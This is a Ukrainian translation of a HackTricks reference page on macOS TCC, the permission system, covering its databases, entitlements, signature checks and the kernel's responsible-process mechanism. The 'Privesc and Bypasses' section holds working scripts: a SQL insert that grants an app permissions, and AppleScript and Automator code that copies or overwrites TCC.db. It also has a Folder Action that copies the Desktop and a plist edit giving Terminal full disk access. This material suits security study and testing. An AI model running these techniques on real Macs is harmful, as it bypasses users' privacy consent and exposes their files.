# macOS TCC

{{#include ../../../../banners/hacktricks-training.md}}

## **Основна інформація**

**TCC (Transparency, Consent, and Control)** — це security protocol, зосереджений на регулюванні дозволів застосунків. Його основна роль полягає в захисті чутливих функцій, таких як **служби геолокації, контакти, фотографії, мікрофон, камера, accessibility та повний доступ до диска**. Вимагаючи явної згоди користувача перед наданням застосунку доступу до цих елементів, TCC посилює приватність і контроль користувача над своїми даними.

Користувачі стикаються з TCC, коли застосунки запитують доступ до захищених функцій. Це відображається у вигляді запиту, який дозволяє користувачам **схвалити або відхилити доступ**. Крім того, TCC підтримує прямі дії користувача, такі як **перетягування файлів у застосунок**, щоб надати доступ до певних файлів і гарантувати, що застосунки отримують доступ лише до явно дозволених ресурсів.

![Приклад запиту TCC](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC** обробляється **daemon**, розташованим у `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd`, і налаштовується у `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` (реєструючи mach service `com.apple.tccd.system`).

Для кожного користувача, який увійшов у систему, працює окремий **user-mode tccd**, визначений у `/System/Library/LaunchAgents/com.apple.tccd.plist`, який реєструє mach services `com.apple.tccd` і `com.apple.usernotifications.delegate.com.apple.tccd`.

Тут можна побачити tccd, який працює як system і як user:
```bash
ps -ef | grep tcc
0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```
Дозволи **успадковуються від батьківської** програми, а **дозволи** **відстежуються** на основі **Bundle ID** і **Developer ID**.

### Бази даних TCC

Дозволи/заборони зберігаються в таких базах даних TCC:

- Загальносистемна база даних у **`/Library/Application Support/com.apple.TCC/TCC.db`** .
- Ця база даних **захищена SIP**, тому записувати в неї можна лише через обхід SIP.
- Користувацька база даних TCC **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** для налаштувань окремого користувача.
- Ця база даних захищена, тому записувати в неї можуть лише процеси з високими привілеями TCC, наприклад Full Disk Access (але вона не захищена SIP).

> [!WARNING]
> Попередні бази даних також **захищені TCC від доступу на читання**. Тому ви **не зможете прочитати** звичайну користувацьку базу даних TCC, якщо це не буде виконано з процесу з привілеями TCC.
>
> Однак пам’ятайте, що процес із такими високими привілеями, як **FDA** або **`kTCCServiceEndpointSecurityClient`**, зможе записувати в користувацьку базу даних TCC

- Існує **третя** база даних TCC у **`/var/db/locationd/clients.plist`**, яка вказує клієнтів, яким дозволено **отримувати доступ до служб геолокації**.
- Захищений SIP файл **`/Users/carlospolop/Downloads/REG.db`** (також захищений TCC від доступу на читання) містить **розташування** всіх **дійсних баз даних TCC**.
- Захищений SIP файл **`/Users/carlospolop/Downloads/MDMOverrides.plist`** (також захищений TCC від доступу на читання) містить додаткові дозволи TCC.
- Захищений SIP файл **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`** (доступний для читання будь-кому) є списком дозволених програм, яким потрібен виняток TCC.

> [!TIP]
> База даних TCC в **iOS** розташована в **`/private/var/mobile/Library/TCC/TCC.db`**

> [!TIP]
> **Інтерфейс Notification Center** може **вносити зміни до системної бази даних TCC**:
>
> ```bash
> codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/> Support/tccd
> [..]
> com.apple.private.tcc.manager
> com.apple.rootless.storage.TCC
> ```
>
> Однак користувачі можуть **видаляти або запитувати правила** за допомогою утиліти командного рядка **`tccutil`**.

#### Запит до баз даних

{{#tabs}}
{{#tab name="user DB"}}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{{#endtab}}

{{#tab name="system DB"}}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{{#endtab}}
{{#endtabs}}

> [!TIP]
> Перевіривши обидві бази даних, можна визначити дозволи, які застосунок дозволив, заборонив або яких він не має (застосунок запитає їх).

- **`service`** — це рядкове представлення дозволу TCC
- **`client`** — це **bundle ID** або **шлях до бінарного файлу**, якому надано дозволи
- **`client_type`** вказує, чи є це Bundle Identifier(0), чи абсолютним шляхом(1)

<details>

<summary>Як виконати, якщо це абсолютний шлях</summary>

Просто виконайте **`launctl load you_bin.plist`**, використовуючи plist на кшталт:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<!-- Label for the job -->
<key>Label</key>
<string>com.example.yourbinary</string>

<!-- The path to the executable -->
<key>Program</key>
<string>/path/to/binary</string>

<!-- Arguments to pass to the executable (if any) -->
<key>ProgramArguments</key>
<array>
<string>arg1</string>
<string>arg2</string>
</array>

<!-- Run at load -->
<key>RunAtLoad</key>
<true/>

<!-- Keep the job alive, restart if necessary -->
<key>KeepAlive</key>
<true/>

<!-- Standard output and error paths (optional) -->
<key>StandardOutPath</key>
<string>/tmp/YourBinary.stdout</string>
<key>StandardErrorPath</key>
<string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```
</details>

- **`auth_value`** може мати різні значення: denied(0), unknown(1), allowed(2) або limited(3).
- **`auth_reason`** може мати такі значення: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
- Поле **`csreq`** вказує, як перевірити binary, який потрібно виконати, і надати йому дозволи TCC:
```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```
- Докладніше про **інші поля** таблиці можна дізнатися в [**цьому дописі в блозі**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).<sup>[[1]](#references)</sup>

Також можна переглянути **вже надані дозволи** для програм у `Системні параметри --> Безпека та конфіденційність --> Конфіденційність --> Файли та папки`.

> [!TIP]
> Користувачі _можуть_ **видаляти правила або виконувати їх запити** за допомогою **`tccutil`**.

#### Скидання дозволів TCC
```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```
### Перевірки підпису TCC

TCC **база даних** зберігає **Bundle ID** застосунку, але також **зберігає** **інформацію** про **підпис**, щоб **переконатися**, що App, який запитує дозвіл, є правильним.
```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```
> [!WARNING]
> Тому інші застосунки з такою самою назвою та bundle ID не зможуть отримати доступ до наданих іншим застосункам дозволів.

### Entitlements і дозволи TCC

Застосункам **потрібно не лише** **запитувати** та **отримувати доступ** до певних ресурсів, їм також потрібно **мати відповідні entitlements**.\
Наприклад, **Telegram** має entitlement `com.apple.security.device.camera`, щоб запитувати **доступ до камери**. **Застосунок**, який **не має** цього **entitlement**, **не зможе** отримати доступ до камери (і користувача навіть не буде запитано про дозвіл).

Зверніть увагу, що entitlements є plist-файлами та є частиною code sig, додатково хешуються в code sig за допомогою спеціальних slots і можуть бути запитані в kernel кодом kernel або кодом user model за допомогою `csops(#169)` чи `csops_audittoken(#170)`.

Однак для того, щоб **отримати доступ** до **певних папок користувача**, таких як `~/Desktop`, `~/Downloads` і `~/Documents`, застосункам **не потрібно** мати жодних спеціальних **entitlements.** Система прозоро оброблятиме доступ і за потреби **запитуватиме користувача**.

- [https://newosxbook.com/ent.php](https://newosxbook.com/ent.php)

Застосунки Apple **не генеруватимуть запитів**. Вони містять **попередньо надані права** у своєму списку **entitlements**, тобто вони **ніколи не показуватимуть popup**, а також **не з’являтимуться в жодній із **баз даних TCC.** Наприклад:
```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
<string>kTCCServiceReminders</string>
<string>kTCCServiceCalendar</string>
<string>kTCCServiceAddressBook</string>
</array>
```
Це не дозволить Calendar запитувати в користувача доступ до нагадувань, календаря й адресної книги.

> [!TIP]
> Окрім деякої офіційної документації про entitlements, також можна знайти неофіційну **цікаву інформацію про entitlements на** [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl)

Деякі дозволи TCC: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... Не існує загальнодоступного списку, який визначає всі з них, але ви можете переглянути цей [**список відомих дозволів**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service).<sup>[[1]](#references)</sup>

### Чутливі незахищені місця

- $HOME (сам каталог)
- $HOME/.ssh, $HOME/.aws тощо
- /tmp

### Намір користувача / com.apple.macl

Як згадувалося раніше, можна **надати App доступ до файлу, перетягнувши\&кинувши його в App**. Цей доступ не буде вказаний у жодній базі даних TCC, а зберігатиметься як **розширений** **атрибут файлу**. Цей атрибут **зберігатиме UUID** дозволеного App:<sup>[[2]](#references)</sup>
```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```
> [!TIP]
> Цікаво, що атрибут **`com.apple.macl`** керується **Sandbox**, а не tccd.
>
> Також зверніть увагу: якщо перемістити файл, який надає доступ UUID певного app на вашому комп’ютері, на інший комп’ютер, він не надасть доступ цьому app, оскільки той самий app матиме інші UID.

Розширений атрибут `com.apple.macl` **не можна очистити**, як інші розширені атрибути, оскільки він **захищений SIP**. Однак, як [**пояснено в цьому дописі**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), його можна вимкнути, **заархівувавши** файл у zip, **видаливши** його та **розпакувавши** архів.<sup>[[3]](#references)</sup>






## Механізм responsible process у XNU

У macOS/iOS механізм **responsible process** є критично важливою функцією безпеки, яку використовує framework **TCC (Transparency, Consent, and Control)** та інші системи безпеки для відстеження процесу, який зрештою відповідає за дію, навіть через ланцюжки дочірніх процесів.

Коли TCC перевіряє дозволи (наприклад, для камери, мікрофона або геолокації), він не завжди перевіряє безпосередній процес, який виконує запит. Натомість він перевіряє **responsible process** — зазвичай GUI-застосунок, який ініціював дію, навіть якщо фактичний запит надходить від допоміжного процесу або daemon.

<details>
<summary>Як встановлюється responsible process</summary>

### Поля структури процесу

Кожен процес у XNU підтримує два ключові ідентифікатори UUID:
```c
// From bsd/sys/proc_internal.h
struct proc {
// ...
pid_t   p_responsible_pid;          // PID of the responsible process
uint8_t p_uuid[16];                 // UUID from LC_UUID load command (self)
uint8_t p_responsible_uuid[16];     // UUID of pid responsible for this process
// ...
};
```
- **`p_uuid`**: Власний UUID процесу (з команди завантаження `LC_UUID` його бінарного файлу Mach-O)
- **`p_responsible_pid`**: PID відповідального процесу
- **`p_responsible_uuid`**: UUID відповідального процесу (зберігається навіть після завершення цього процесу)

### Як встановлюється відповідальний процес

1. **Під час створення процесу (Fork)**

Коли новий процес створюється через `fork()` або `posix_spawn()`, відповідальний процес успадковується від батьківського (`exec()` syscall повторно використовує наявну структуру `proc`, тому цей крок не повторюється):

**Розташування**: `bsd/kern/kern_fork.c:1053`
```c
// In fork1_internal() - called during all process creation
proc_set_responsible_pid(child_proc, parent_proc->p_responsible_pid);
```
**Ключові моменти:**
- Дочірні процеси **успадковують** `p_responsible_pid` батьківського процесу
- Це створює **ланцюжок відповідальності** в ієрархії процесів
- Відповідальний процес зазвичай вказує на початковий GUI-застосунок

2. **Основна функція: `proc_set_responsible_pid()`**

**Розташування**: `bsd/kern/kern_proc.c:4817-4831`
```c
void
proc_set_responsible_pid(proc_t target_proc, pid_t responsible_pid)
{
target_proc->p_responsible_pid = responsible_pid;

if (responsible_pid >= 0) {
proc_t responsible_proc = proc_find(responsible_pid);
if (responsible_proc != PROC_NULL) {
// Copy the responsible process's UUID for persistent identification
proc_getexecutableuuid(responsible_proc,
target_proc->p_responsible_uuid,
sizeof(target_proc->p_responsible_uuid));
proc_rele(responsible_proc);
}
}
return;
}
```
**Що робить ця функція:**
1. **Встановлює відповідальний PID** у цільовому процесі
2. **Знаходить відповідальний процес** за допомогою `proc_find()` (збільшує reference count)
3. **Копіює UUID** з `p_uuid` відповідального процесу до `p_responsible_uuid` цільового процесу
4. **Звільняє reference** за допомогою `proc_rele()` (зменшує reference count)

3. **Навіщо зберігати і PID, і UUID?**

Підхід із подвійним зберіганням вирішує критичну проблему:

| Поле | Призначення | Проблема | Рішення |
|-------|---------|---------|----------|
| `p_responsible_pid` | Швидкий пошук поточного процесу | PID може бути повторно використаний після завершення процесу | Використовується для пошуку активного процесу |
| `p_responsible_uuid` | Постійна ідентифікація | Зберігається після завершення процесу | Використовується для security checks та auditing |

**Проблема**: Якщо відповідальний процес завершиться раніше за дочірній, PID може бути повторно використаний і призначений зовсім іншому процесу.

**Рішення**: UUID є незмінним і однозначно ідентифікує конкретний binary, який був відповідальним, навіть після його завершення.

### Потік створення процесу
```
┌─────────────────────────────────────────────────────────────┐
│ Parent Process (e.g., Safari)                               │
│ p_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81              │
│ p_responsible_pid: 1234 (points to itself)                 │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
└─────────────────────┬───────────────────────────────────────┘
│
│ fork() / posix_spawn()
▼
┌────────────────────────────┐
│ kern_fork.c:fork1_internal │
│                            │
│ proc_set_responsible_pid(  │
│   child_proc,              │
│   parent->p_responsible_pid│
│ );                         │
└────────────┬───────────────┘
│
▼
┌────────────────────────────┐
│ proc_set_responsible_pid() │
│                            │
│ 1. Set p_responsible_pid   │
│ 2. Find responsible proc   │
│ 3. Copy UUID               │
│ 4. Release reference       │
└────────────┬───────────────┘
│
▼
┌─────────────────────────────────────────────────────────────┐
│ Child Process (e.g., SafariHelper)                          │
│ p_uuid: B266C9DD-8E3F-4AAA-9F1E-71D2E3CDEF82              │
│ p_responsible_pid: 1234 (inherited from parent)            │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
│                     (copied from Safari)                    │
└─────────────────────────────────────────────────────────────┘
```
### Джерело UUID: команда завантаження LC_UUID

UUID, що зберігається в `p_uuid`, походить із **команди завантаження `LC_UUID` виконуваного файлу Mach-O**:

1. **Під час компіляції**
```bash
# When linking, the linker (ld) generates a unique UUID
$ ld -o myapp myapp.o
# Embedded in the Mach-O binary as LC_UUID load command
```
2. **Час виконання**

**Розташування**: `bsd/kern/mach_loader.c:2393-2413`
```c
static load_return_t
load_uuid(struct uuid_command *uulp, char *command_end, load_result_t *result)
{
if ((uulp->cmdsize < sizeof(struct uuid_command)) ||
(((char *)uulp + sizeof(struct uuid_command)) > command_end)) {
return LOAD_BADMACHO;
}

// Extract UUID from LC_UUID load command
memcpy(&result->uuid[0], &uulp->uuid[0], sizeof(result->uuid));
return LOAD_SUCCESS;
}
```
3. **Зберігається у структурі процесу**

**Розташування**: `bsd/kern/kern_exec.c:2281`
```c
// After loading the Mach-O binary during exec()
proc_setexecutableuuid(p, &load_result.uuid[0]);
```
**Розташування**: `bsd/kern/kern_proc.c:1912-1915`
```c
void
proc_setexecutableuuid(proc_t p, const unsigned char *uuid)
{
memcpy(p->p_uuid, uuid, sizeof(p->p_uuid));
}
```
</details>


## Privesc і Bypasses TCC

### Вставка в TCC

Якщо вам у якийсь момент вдасться отримати доступ на запис до бази даних TCC, ви можете використати щось на кшталт наведеного нижче, щоб додати запис (видаліть коментарі):

<details>

<summary>Приклад вставки в TCC</summary>
```sql
INSERT INTO access (
service,
client,
client_type,
auth_value,
auth_reason,
auth_version,
csreq,
policy_id,
indirect_object_identifier_type,
indirect_object_identifier,
indirect_object_code_identity,
flags,
last_modified,
pid,
pid_version,
boot_uuid,
last_reminded
) VALUES (
'kTCCServiceSystemPolicyDesktopFolder', -- service
'com.googlecode.iterm2', -- client
0, -- client_type (0 - bundle id)
2, -- auth_value  (2 - allowed)
3, -- auth_reason (3 - "User Set")
1, -- auth_version (always 1)
X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
NULL, -- policy_id
NULL, -- indirect_object_identifier_type
'UNUSED', -- indirect_object_identifier - default value
NULL, -- indirect_object_code_identity
0, -- flags
strftime('%s', 'now'), -- last_modified with default current timestamp
NULL, -- assuming pid is an integer and optional
NULL, -- assuming pid_version is an integer and optional
'UNUSED', -- default value for boot_uuid
strftime('%s', 'now') -- last_reminded with default current timestamp
);
```
</details>

### TCC Payloads

Якщо вам вдалося проникнути в застосунок із деякими дозволами TCC, перегляньте наступну сторінку з TCC payloads, щоб зловживати ними:


{{#ref}}
macos-tcc-payloads.md
{{#endref}}

### Apple Events

Дізнайтеся більше про Apple Events у:


{{#ref}}
macos-apple-events.md
{{#endref}}

### Automation (Finder) to FDA\*

Назва дозволу Automation у TCC: **`kTCCServiceAppleEvents`**\
Цей конкретний дозвіл TCC також вказує **застосунок, яким можна керувати** в базі даних TCC (тому цей дозвіл не дає змоги керувати всім без винятку).

**Finder** — це застосунок, який **завжди має FDA** (навіть якщо це не відображається в UI), тому якщо у вас є привілеї **Automation** для нього, ви можете зловживати його привілеями, щоб **змусити його виконувати певні дії**.\
У цьому випадку вашому застосунку потрібен дозвіл **`kTCCServiceAppleEvents`** для **`com.apple.Finder`**.<sup>[[4]](#references)</sup>

{{#tabs}}
{{#tab name="Steal users TCC.db"}}
```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
set homeFolder to path to home folder as string
set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{{#endtab}}

{{#tab name="Steal systems TCC.db"}}
```applescript
osascript<<EOD
tell application "Finder"
set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{{#endtab}}
{{#endtabs}}

Цим можна зловживати, щоб **записати власну базу даних TCC користувача**.

> [!WARNING]
> Маючи цей дозвіл, ви зможете **попросити Finder отримати доступ до папок, обмежених TCC, і передати вам файли**, але, наскільки мені відомо, ви **не зможете змусити Finder виконати довільний код**, щоб повністю скористатися його доступом FDA.
>
> Тому ви не зможете скористатися всіма можливостями FDA.

Це запит TCC для отримання привілеїв Automation над Finder:

<figure><img src="../../../../images/image (27).png" alt="" width="244"><figcaption></figcaption></figure>

> [!CAUTION]
> Зверніть увагу, що оскільки застосунок **Automator** має дозвіл TCC **`kTCCServiceAppleEvents`**, він може **керувати будь-яким застосунком**, зокрема Finder. Отже, маючи дозвіл на керування Automator, ви також зможете керувати **Finder** за допомогою коду, наведеного нижче:

<details>

<summary>Отримання shell всередині Automator</summary>
```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
set actionID to Automator action id "com.apple.RunShellScript"
tell (make new workflow)
add actionID to it
tell last Automator action
set value of setting "inputMethod" to 1
set value of setting "COMMAND_STRING" to theScript
end tell
execute it
end tell
activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```
</details>

Те саме відбувається із **Script Editor app,** яка може керувати Finder, але за допомогою AppleScript не можна змусити її виконати скрипт.

### Automation (SE) до деяких TCC

**System Events може створювати Folder Actions, а Folder Actions можуть отримувати доступ до деяких папок TCC** (Desktop, Documents і Downloads), тому для зловживання цією поведінкою можна використати такий скрипт:
```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
-- Ensure Folder Actions are enabled
set folder actions enabled to true

-- Define the path to the folder and the script
set homeFolder to path to home folder as text
set folderPath to homeFolder & "Desktop"
set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

-- Create or get the Folder Action for the Desktop
if not (exists folder action folderPath) then
make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
end if
set myFolderAction to folder action folderPath

-- Attach the script to the Folder Action
if not (exists script scriptPath of myFolderAction) then
make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
end if

-- Enable the Folder Action and the script
enable myFolderAction
end tell
EOD

# File operations in the folder should trigger the Folder Action
touch "$HOME/Desktop/file"
rm "$HOME/Desktop/file"
```
### Automation (SE) + Accessibility (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**)** для FDA\*

Automation у **`System Events`** + Accessibility (**`kTCCServicePostEvent`**) дозволяє надсилати **keystrokes до процесів**. Таким чином, можна зловживати Finder, щоб змінити TCC.db користувачів або надати FDA довільному застосунку (хоча для цього може бути запитано пароль).

Приклад перезапису TCC.db користувачів через Finder:
```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
-- Open Finder
tell application "Finder" to activate

-- Open the /tmp directory
keystroke "g" using {command down, shift down}
delay 1
keystroke "/tmp"
delay 1
keystroke return
delay 1

-- Select and copy the file
keystroke "TCC.db"
delay 1
keystroke "c" using {command down}
delay 1

-- Resolve $HOME environment variable
set homePath to system attribute "HOME"

-- Navigate to the Desktop directory under $HOME
keystroke "g" using {command down, shift down}
delay 1
keystroke homePath & "/Library/Application Support/com.apple.TCC"
delay 1
keystroke return
delay 1

-- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
keystroke "TCC.db"
delay 1
keystroke return
delay 1
key code 51 using {command down}
delay 1

-- Paste the file
keystroke "v" using {command down}
end tell
EOF
```
### `kTCCServiceAccessibility` до FDA\*

Перегляньте цю сторінку, щоб знайти деякі [**payloads для зловживання дозволами Accessibility**](macos-tcc-payloads.md#accessibility) з метою privesc до FDA\* або, наприклад, запуску keylogger.

### **Endpoint Security Client до FDA**

Якщо у вас є **`kTCCServiceEndpointSecurityClient`**, у вас є FDA. Кінець.

### System Policy SysAdmin File до FDA

**`kTCCServiceSystemPolicySysAdminFiles`** дозволяє **змінювати** атрибут **`NFSHomeDirectory`** користувача, який змінює його домашню папку, і, таким чином, дозволяє **обійти TCC**.<sup>[[5]](#references)</sup>

### User TCC DB до FDA

Отримавши **права на запис** до **user TCC** database, ви **не можете** надати собі права **`FDA`** — це може зробити лише база даних, розташована в системній database.

Але ви **можете** надати собі **Automation rights to Finder** і скористатися попередньою технікою для ескалації до FDA\*.

### **FDA до дозволів TCC**

**Full Disk Access** у TCC має назву **`kTCCServiceSystemPolicyAllFiles`**

Не думаю, що це справжня privesc, але, можливо, це стане вам у пригоді: якщо ви контролюєте програму з FDA, ви можете **змінити TCC database користувача та надати собі будь-який доступ**. Це може бути корисним як persistence technique на випадок, якщо ви втратите свої дозволи FDA.

### **SIP Bypass до TCC Bypass**

Системна **TCC database** захищена **SIP**, тому лише процеси з **вказаними entitlements зможуть змінювати** її. Отже, якщо attacker знайде **SIP bypass** для **file** (отримає можливість змінювати file, захищений SIP), він зможе:

- **Видалити захист** TCC database і надати собі всі дозволи TCC. Наприклад, він може зловживати будь-яким із цих files:
- Системна TCC database
- REG.db
- MDMOverrides.plist

Однак є ще один варіант використання цього **SIP bypass для обходу TCC**: file `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` є allow list програм, яким потрібен виняток TCC. Тому, якщо attacker може **видалити SIP protection** із цього file та додати **власну application**, application зможе обійти TCC.\
Наприклад, щоб додати terminal:
```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```
AllowApplicationsList.plist:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Services</key>
<dict>
<key>SystemPolicyAllFiles</key>
<array>
<dict>
<key>CodeRequirement</key>
<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
<key>IdentifierType</key>
<string>bundleID</string>
<key>Identifier</key>
<string>com.apple.Terminal</string>
</dict>
</array>
</dict>
</dict>
</plist>
```
### Обходи TCC


{{#ref}}
macos-tcc-bypasses/
{{#endref}}

## Посилання

- [1] [Детальний аналіз macOS TCC.db - блог Rainforest QA](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
- [2] [maclTrack.command - скрипт для відстеження com.apple.macl (Gist від brunerd)](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
- [3] [Відстеження та аналіз com.apple.macl](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
- [4] [Обхід захисту конфіденційності користувачів macOS TCC випадково та навмисно](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [5] [Зміна домашнього каталогу та обхід TCC, або CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)

{{#include ../../../../banners/hacktricks-training.md}}
